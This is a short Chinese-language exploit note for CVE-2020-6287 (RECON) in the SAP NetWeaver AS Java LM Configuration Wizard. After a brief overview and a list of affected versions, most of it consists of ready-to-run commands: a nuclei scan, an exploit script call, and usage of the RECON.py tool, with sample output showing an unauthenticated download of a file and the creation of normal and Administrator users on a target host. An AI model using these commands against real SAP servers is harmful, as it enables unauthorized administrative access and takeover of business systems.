## 漏洞概述

在`SAP NetWeaver AS Java` 的`LM`配置向导中缺乏身份验证，未经身份验证的远程攻击者可以执行有危害的操作，包括但不限于创建管理员用户。攻击者可能获得对`adm`的访问权限，`adm`是操作系统用户，它可以无限制地访问与`SAP`系统相关的所有本地资源。

## 影响范围

```http
SAP NetWeaver AS JAVA（LM Configuration Wizard）7.30
SAP NetWeaver AS JAVA（LM Configuration Wizard）7.31
SAP NetWeaver AS JAVA（LM Configuration Wizard）7.40
SAP NetWeaver AS JAVA（LM Configuration Wizard）7.50
```

## POC

```bash
nuceli -tags sap -t cves/ -l urls.txt
```

## EXP

```bash
python CVE-2020-6287.py http://vul-IP:50000/ test123 test@123123
```
## EXP (RECON.py)

[chipik/SAP_RECON](https://github.com/chipik/SAP_RECON)
Just point SAP NW AS Java hostnmae/ip.

There is additional options:

1. `-c` - check if SAP server is vulnerable to RECON
2. `-f` - download `zip` file from SAP server
3. `-u` - create user SAP JAVA user with  `Authenticated User` role 
4. `-a` - create user SAP JAVA user with  `Administrator` role


Ex.: Download zip file

```bash
python RECON.py -H 172.16.30.8 -f /1111.zip
Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Ok! File zipfile_929.zip was saved
```


Ex.: Create SAP JAVA user

```bash
~python RECON.py -H 172.16.30.8 -u
Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Going to create new user. sapRpoc5484:Secure!PwD9379
Ok! User were created
```

Ex.: Create SAP JAVA Administrator user

```bash
~python RECON.py -H 172.16.30.8 -a
Check1 - Vulnerable! [CVE-2020-6287] (RECON) - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Going to create new user sapRpoc5574:Secure!PwD7715 with role 'Administrator'
Ok! Admin user were created
```